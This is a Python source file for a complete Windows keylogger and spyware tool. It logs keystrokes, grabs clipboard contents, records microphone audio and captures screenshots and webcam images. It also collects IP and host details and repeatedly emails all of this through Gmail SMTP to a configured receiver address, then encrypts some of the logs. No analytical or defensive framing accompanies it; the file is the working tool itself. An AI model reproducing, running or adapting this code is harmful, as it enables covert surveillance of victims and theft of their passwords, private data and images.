import os
import json
import time
import socket
import platform
import smtplib
import win32clipboard
import sounddevice as sd
from scipy.io.wavfile import write
from cv2 import VideoCapture, imwrite
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from cryptography.fernet import Fernet

class Keylogger:
    def __init__(self, config_file="config.json"):
        self.load_config(config_file)
        self.file_merge = self.config['file_path']
        self.files = {
            "keys": "key_log.txt",
            "system": "system_info.txt",
            "clipboard": "clipboard.txt",
            "audio": "audio.wav",
            "screenshot": "screenshot.png",
            "webcam": "webcam.png"
        }
        self.iteration = 0
        self.count = 0
        self.keys = []
        self.current_time = time.time()
        self.stop_time = self.current_time + self.config['log_interval']

    def load_config(self, path):
        with open(path, 'r') as f:
            self.config = json.load(f)

    def send_email(self, filename, filepath):
        msg = MIMEMultipart()
        msg['From'] = self.config['email']
        msg['To'] = self.config['receiver_email']
        msg['Subject'] = "Log File"

        msg.attach(MIMEText("Attached log file", 'plain'))
        with open(filepath, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.config['email'], self.config['password'])
        server.send_message(msg)
        server.quit()

    def system_info(self):
        with open(self.file_merge + self.files['system'], 'w') as f:
            try:
                f.write(f"Public IP: {get('https://api.ipify.org').text}\n")
            except:
                f.write("Could not retrieve Public IP\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {socket.gethostname()}\n")
            f.write(f"Private IP: {socket.gethostbyname(socket.gethostname())}\n")

    def clipboard_info(self):
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        except:
            data = "Could not access clipboard."
        with open(self.file_merge + self.files['clipboard'], 'w') as f:
            f.write("Clipboard Data:\n" + data)

    def record_audio(self):
        path = self.file_merge + self.files['audio']
        duration = self.config['microphone_duration']
        recording = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
        sd.wait()
        write(path, 44100, recording)

    def capture_screenshot(self):
        img = ImageGrab.grab()
        img.save(self.file_merge + self.files['screenshot'])

    def capture_webcam(self):
        cam = VideoCapture(0)
        ret, img = cam.read()
        if ret:
            imwrite(self.file_merge + self.files['webcam'], img)
        cam.release()

    def write_keys(self):
        with open(self.file_merge + self.files['keys'], 'a') as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write("\n")
                elif "Key" not in k:
                    f.write(k)

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        self.current_time = time.time()
        if self.count >= 1:
            self.write_keys()
            self.count = 0
            self.keys = []

    def on_release(self, key):
        if key == Key.esc or self.current_time > self.stop_time:
            return False

    def encrypt_files(self):
        fernet = Fernet(self.config['encryption_key'].encode())
        for key in ['keys', 'system', 'clipboard']:
            path = self.file_merge + self.files[key]
            with open(path, 'rb') as f:
                encrypted = fernet.encrypt(f.read())
            with open(path, 'wb') as f:
                f.write(encrypted)

    def run(self):
        os.makedirs(self.file_merge, exist_ok=True)
        self.system_info()
        self.clipboard_info()
        self.record_audio()
        self.capture_screenshot()
        self.capture_webcam()

        while self.iteration < self.config['log_iterations']:
            self.current_time = time.time()
            self.stop_time = self.current_time + self.config['log_interval']
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()

            for file in ['keys', 'system', 'clipboard']:
                self.send_email(self.files[file], self.file_merge + self.files[file])

            self.capture_screenshot()
            self.send_email(self.files['screenshot'], self.file_merge + self.files['screenshot'])

            self.capture_webcam()
            self.send_email(self.files['webcam'], self.file_merge + self.files['webcam'])

            self.iteration += 1

        self.encrypt_files()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()
